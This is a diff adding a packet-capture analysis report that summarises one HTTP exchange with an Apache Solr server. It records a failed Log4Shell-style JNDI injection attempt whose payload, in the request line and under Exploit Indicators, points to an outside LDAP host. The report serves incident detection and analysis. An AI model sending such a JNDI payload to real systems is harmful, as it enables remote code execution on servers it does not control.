@@ -1,0 +1,30 @@
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 1
+TCP Stream IDs: 0
+Protocol Counts: ICMPv6=2, ARP=2, TCP=8, HTTP=1, DNS=8, HTTP/JSON=1
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.1:51346           <-> 172.18.0.2:8983                  4 1025 bytes       6 720 bytes      10 1745 bytes   120.751736000         0.6533
+================================================================================
+
+
+=== Flow Analysis ===
+
+--- Stream 0 [VALID] ---
+Service: Apache Solr
+Relevant Events:
+- [E-S0000-F000008-004] GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}
+- [E-S0000-F000012-010] root user keyword observed
+- [E-S0000-F000012-009] HTTP Status 400
+Exploit Indicators:
+- [E-S0000-F000008-004] ${jndi:ldap://8qvsbr.sdasda1212.cn}
+Malicious Activities: None
+Attack Success: Failed
+Evidence Keywords: jndi, ldap, Solr, 400, admin, root
